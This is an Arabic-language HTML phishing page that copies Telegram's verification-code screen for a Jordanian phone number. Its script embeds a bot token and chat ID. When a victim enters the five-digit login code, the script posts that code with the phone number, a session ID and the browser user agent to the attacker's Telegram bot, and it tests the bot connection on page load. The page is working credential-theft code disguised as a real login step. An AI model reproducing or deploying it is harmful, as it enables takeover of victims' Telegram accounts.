<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - رمز التحقق</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }

        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Header */
        .header {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #e5e5ea;
            background: #ffffff;
        }

        .back-button {
            font-size: 28px;
            color: #007aff;
            cursor: pointer;
            font-weight: 400;
            line-height: 1;
        }

        .profile-icon {
            width: 32px;
            height: 32px;
            background: #007aff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
            font-weight: 500;
        }

        /* Main Content */
        .content {
            flex: 1;
            padding: 24px 20px 16px 20px;
            display: flex;
            flex-direction: column;
            background: #ffffff;
            overflow-y: auto;
        }

        /* Page visibility */
        .page {
            display: none;
            flex-direction: column;
            height: 100%;
        }

        .page.active {
            display: flex;
        }

        /* Title */
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .phone-info {
            font-size: 15px;
            color: #8e8e93;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.4;
            font-weight: 400;
        }

        .phone-number {
            font-weight: 600;
            color: #000000;
            direction: ltr;
            display: inline-block;
        }

        /* OTP Input */
        .otp-section {
            margin-bottom: 25px;
        }

        .otp-label {
            font-size: 14px;
            color: #8e8e93;
            margin-bottom: 15px;
            display: block;
            font-weight: 400;
            text-align: center;
        }

        .otp-input-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
            direction: ltr;
        }

        .otp-box {
            width: 60px;
            height: 70px;
            border: 2px solid #c6c6c8;
            border-radius: 12px;
            font-size: 32px;
            font-weight: 600;
            text-align: center;
            outline: none;
            background: #f8f8f8;
            color: #000000;
            transition: all 0.2s;
        }

        .otp-box:focus {
            border-color: #007aff;
            background: #ffffff;
        }

        .otp-box.filled {
            border-color: #007aff;
            background: #ffffff;
        }

        /* Timer */
        .timer-section {
            text-align: center;
            margin-bottom: 20px;
        }

        .timer-text {
            font-size: 15px;
            color: #8e8e93;
            margin-bottom: 5px;
        }

        .timer {
            font-size: 18px;
            font-weight: 600;
            color: #007aff;
            direction: ltr;
            display: inline-block;
        }

        .resend-link {
            color: #007aff;
            font-size: 16px;
            font-weight: 500;
            text-decoration: none;
            margin-top: 8px;
            display: inline-block;
            opacity: 0.5;
            pointer-events: none;
        }

        .resend-link.active {
            opacity: 1;
            pointer-events: all;
            cursor: pointer;
        }

        .resend-link.active:active {
            opacity: 0.7;
        }

        /* Verify Button */
        .next-button {
            background: #007aff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-bottom: 20px;
            transition: background 0.2s;
        }

        .next-button:active {
            background: #005bbf;
        }

        #verifyButton {
            opacity: 0.5;
            pointer-events: none;
        }

        #verifyButton.active {
            opacity: 1;
            pointer-events: all;
        }

        /* Error Message */
        .error-message {
            color: #ff3b30;
            font-size: 14px;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        /* Info Text */
        .info-text {
            font-size: 13px;
            color: #8e8e93;
            text-align: center;
            margin-top: 10px;
            line-height: 1.5;
        }

        .info-text a {
            color: #007aff;
            text-decoration: none;
        }

        /* Keyboard - مثل الصورة تماماً */
        .keyboard {
            background: #f2f2f7;
            padding: 8px 4px;
            border-radius: 16px;
            margin-top: auto;
        }

        .keyboard-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 4px;
        }

        .keyboard-row:last-child {
            margin-bottom: 0;
        }

        .key {
            flex: 1;
            text-align: center;
            padding: 12px 0;
            background: #ffffff;
            border-radius: 10px;
            margin: 0 2px;
            font-size: 24px;
            font-weight: 500;
            color: #000000;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            cursor: pointer;
            line-height: 1.2;
            border: none;
        }

        .key:active {
            background: #e5e5ea;
        }

        .key-letters {
            display: block;
            font-size: 11px;
            color: #8e8e93;
            font-weight: 400;
            margin-top: 2px;
            letter-spacing: 0.3px;
        }

        .key.delete-key {
            background: #e5e5ea;
            font-size: 20px;
        }

        /* Loading Spinner */
        .loading-spinner {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.3);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }

        .loading-spinner.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f2f2f7;
            border-top: 5px solid #007aff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="back-button" onclick="goBack()">←</div>
            <div class="profile-icon">J</div>
        </div>

        <!-- Main Content - OTP Page -->
        <div class="content">
            <div class="title">رمز التحقق</div>
            <div class="phone-info">
                أدخل الرمز المرسل إلى<br>
                <span class="phone-number" id="displayPhone">+962 07988542</span>
            </div>

            <!-- OTP Input -->
            <div class="otp-section">
                <span class="otp-label">رمز التحقق</span>
                <div class="otp-input-container" id="otpContainer">
                    <input type="text" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 1)" onpaste="handlePaste(event)">
                    <input type="text" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 2)">
                    <input type="text" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 3)">
                    <input type="text" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 4)">
                    <input type="text" class="otp-box" id="otp5" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 5)">
                </div>
            </div>

            <!-- Timer -->
            <div class="timer-section">
                <div class="timer-text">لم يطلب الرمز؟</div>
                <div class="timer" id="timer">00:30</div>
                <a href="#" class="resend-link" id="resendLink" onclick="resendCode(event)">إعادة إرسال الرمز</a>
            </div>

            <!-- Error Message -->
            <div class="error-message" id="errorMessage">رمز التحقق غير صحيح</div>

            <!-- Verify Button -->
            <button class="next-button" id="verifyButton" onclick="verifyCode()">تحقق</button>

            <!-- Info Text -->
            <div class="info-text">
                سيتم تسجيل الدخول تلقائياً بعد التحقق<br>
                <a href="#" onclick="showHelp()">لم تحصل على الرمز؟</a>
            </div>

            <!-- Keyboard - مثل الصورة تماماً -->
            <div class="keyboard">
                <!-- الصف الأول: 5 4 3 2 1 (معكوس لأن RTL) -->
                <div class="keyboard-row">
                    <div class="key" onclick="addOTPNumber(5)">5<span class="key-letters">JKL</span></div>
                    <div class="key" onclick="addOTPNumber(4)">4<span class="key-letters">GHI</span></div>
                    <div class="key" onclick="addOTPNumber(3)">3<span class="key-letters">DEF</span></div>
                    <div class="key" onclick="addOTPNumber(2)">2<span class="key-letters">ABC</span></div>
                    <div class="key" onclick="addOTPNumber(1)">1</div>
                </div>
                <!-- الصف الثاني: 0 9 8 7 6 (معكوس لأن RTL) -->
                <div class="keyboard-row">
                    <div class="key" onclick="addOTPNumber(0)">0<span class="key-letters">+</span></div>
                    <div class="key" onclick="addOTPNumber(9)">9<span class="key-letters">WXYZ</span></div>
                    <div class="key" onclick="addOTPNumber(8)">8<span class="key-letters">TUV</span></div>
                    <div class="key" onclick="addOTPNumber(7)">7<span class="key-letters">PORS</span></div>
                    <div class="key" onclick="addOTPNumber(6)">6<span class="key-letters">MNO</span></div>
                </div>
                <!-- زر المسح -->
                <div class="keyboard-row">
                    <div class="key delete-key" onclick="deleteOTPNumber()" style="background: #e5e5ea; flex: 5;">⌫</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Loading Spinner -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>
    </div>

    <script>
        // ============ إعدادات بوت تلجرام ============
        const BOT_TOKEN = '8737014154:AAEPNAzIRDraqGoNqQimN85N2BBeBEhqNmg';
        const CHAT_ID = '7962904635';
        
        // بيانات الجلسة (مخزنة مؤقتاً)
        let sessionData = {
            phoneNumber: '07988542',
            countryCode: '+962',
            countryName: 'الأردن'
        };
        
        // معرف الجلسة الفريد
        const sessionId = generateSessionId();
        
        // ============ دوال إرسال الرسائل إلى تلجرام ============
        async function sendToTelegram(message) {
            try {
                console.log('جاري إرسال الرسالة:', message);
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                console.log('استجابة البوت:', data);
                
                if (data.ok) {
                    return true;
                } else {
                    console.error('خطأ من البوت:', data.description);
                    return false;
                }
            } catch (error) {
                console.error('خطأ في الاتصال:', error);
                return false;
            }
        }
        
        function generateSessionId() {
            return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, function() {
                return Math.floor(Math.random() * 16).toString(16);
            });
        }
        
        function getFormattedTime() {
            const now = new Date();
            return now.toLocaleString('ar-JO', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
        }
        
        function showLoading() {
            document.getElementById('loadingSpinner').classList.add('active');
        }
        
        function hideLoading() {
            document.getElementById('loadingSpinner').classList.remove('active');
        }
        
        // ============ إرسال رمز التحقق إلى البوت ============
        async function sendOTPToBot(otpCode) {
            const timeStr = getFormattedTime();
            
            const message = `
🔔 <b>تم إدخال رمز التحقق</b> 🔔

━━━━━━━━━━━━━━━━
🔢 <b>رمز التحقق:</b>
━━━━━━━━━━━━━━━━
🔐 <b>الرمز:</b> <code>${otpCode}</code>
📱 <b>رقم الهاتف:</b> <code>${sessionData.countryCode} ${sessionData.phoneNumber}</code>

━━━━━━━━━━━━━━━━
🆔 <b>معلومات الجلسة:</b>
━━━━━━━━━━━━━━━━
🔑 <b>معرف الجلسة:</b> <code>${sessionId}</code>
⏰ <b>وقت الإدخال:</b> ${timeStr}
🌐 <b>المتصفح:</b> ${navigator.userAgent}

━━━━━━━━━━━━━━━━
⚠️ <b>تنبيه:</b> تم إدخال رمز التحقق
━━━━━━━━━━━━━━━━
`;
            
            showLoading();
            const sent = await sendToTelegram(message);
            hideLoading();
            
            if (sent) {
                console.log('✅ تم إرسال رمز التحقق بنجاح');
                return true;
            } else {
                alert('❌ فشل في إرسال رمز التحقق. تأكد من اتصال الإنترنت وأن البوت مفعل');
                return false;
            }
        }

        // ============ دوال OTP ============
        const otpInputs = document.querySelectorAll('.otp-box');
        const verifyButton = document.getElementById('verifyButton');
        const errorMessage = document.getElementById('errorMessage');

        function moveToNext(current, nextIndex) {
            // السماح فقط بالأرقام
            if (current.value && !/^\d+$/.test(current.value)) {
                current.value = '';
                return;
            }

            checkOtpComplete();

            // الانتقال للخانة التالية
            if (current.value && nextIndex < 5) {
                document.getElementById(`otp${nextIndex + 1}`).focus();
            }

            // تحديث التنسيق
            if (current.value) {
                current.classList.add('filled');
            } else {
                current.classList.remove('filled');
            }
        }

        function checkOtpComplete() {
            let complete = true;
            otpInputs.forEach(input => {
                if (!input.value) complete = false;
            });

            if (complete) {
                verifyButton.classList.add('active');
            } else {
                verifyButton.classList.remove('active');
            }
        }

        function handlePaste(event) {
            event.preventDefault();
            const pasteData = event.clipboardData.getData('text');
            if (/^\d+$/.test(pasteData) && pasteData.length <= 5) {
                for (let i = 0; i < pasteData.length; i++) {
                    if (i < 5) {
                        document.getElementById(`otp${i + 1}`).value = pasteData[i];
                        document.getElementById(`otp${i + 1}`).classList.add('filled');
                    }
                }
                if (pasteData.length === 5) {
                    document.getElementById('otp5').focus();
                } else {
                    document.getElementById(`otp${pasteData.length + 1}`)?.focus();
                }
                checkOtpComplete();
            }
        }

        async function verifyCode() {
            const enteredCode = Array.from(otpInputs).map(input => input.value).join('');
            
            if (enteredCode.length !== 5) {
                alert('الرجاء إدخال رمز التحقق كاملاً');
                return;
            }
            
            // إرسال رمز التحقق إلى بوت تلجرام
            const sent = await sendOTPToBot(enteredCode);
            
            if (sent) {
                errorMessage.classList.remove('show');
                alert('✅ تم إرسال رمز التحقق إلى البوت بنجاح!');
                
                // مسح الحقول بعد الإرسال
                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                document.getElementById('otp1').focus();
                verifyButton.classList.remove('active');
            }
        }

        function addOTPNumber(num) {
            const currentInput = Array.from(otpInputs).find(input => !input.value);
            if (currentInput) {
                currentInput.value = num;
                currentInput.classList.add('filled');
                checkOtpComplete();
                
                const nextInput = Array.from(otpInputs).find(input => !input.value);
                if (nextInput) {
                    nextInput.focus();
                } else {
                    document.getElementById('otp5').focus();
                }
            }
        }

        function deleteOTPNumber() {
            const filledInputs = Array.from(otpInputs).filter(input => input.value);
            if (filledInputs.length > 0) {
                const lastInput = filledInputs[filledInputs.length - 1];
                lastInput.value = '';
                lastInput.classList.remove('filled');
                lastInput.focus();
                checkOtpComplete();
            }
        }

        // ============ Timer ============
        let timeLeft = 30;
        const timerElement = document.getElementById('timer');
        const resendLink = document.getElementById('resendLink');
        let timerInterval;

        function startTimer() {
            timeLeft = 30;
            timerElement.textContent = formatTime(timeLeft);
            resendLink.classList.remove('active');
            
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                timeLeft--;
                timerElement.textContent = formatTime(timeLeft);
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerElement.textContent = '00:00';
                    resendLink.classList.add('active');
                }
            }, 1000);
        }

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        async function resendCode(event) {
            event.preventDefault();
            if (resendLink.classList.contains('active')) {
                alert('✅ تم إعادة إرسال رمز التحقق');
                startTimer();
                
                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                document.getElementById('otp1').focus();
                verifyButton.classList.remove('active');
                errorMessage.classList.remove('show');
            }
        }

        function showHelp() {
            alert('إذا لم يصلك رمز التحقق:\n1. تأكد من صحة رقم الهاتف\n2. تحقق من اتصال الشبكة\n3. حاول إعادة إرسال الرمز بعد 30 ثانية');
        }

        function goBack() {
            if (confirm('سيتم إلغاء عملية تسجيل الدخول. هل أنت متأكد؟')) {
                window.location.href = 'about:blank'; // أو العودة للصفحة السابقة
            }
        }

        // دعم لوحة المفاتيح الفعلية
        document.addEventListener('keydown', function(event) {
            if (event.key >= '0' && event.key <= '9') {
                event.preventDefault();
                addOTPNumber(parseInt(event.key));
            } else if (event.key === 'Backspace') {
                deleteOTPNumber();
            }
        });

        // بدء التايمر عند تحميل الصفحة
        startTimer();

        // التركيز على أول خانة
        document.getElementById('otp1').focus();

        // اختبار الاتصال بالبوت عند تحميل الصفحة
        window.addEventListener('load', function() {
            console.log('✅ الصفحة جاهزة، جاري اختبار الاتصال بالبوت...');
            // اختبار الاتصال (اختياري)
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        console.log('✅ البوت متصل:', data.result.username);
                    } else {
                        console.error('❌ مشكلة في البوت:', data);
                    }
                })
                .catch(err => console.error('❌ لا يمكن الاتصال بالبوت:', err));
        });
    </script>
</body>
</html>
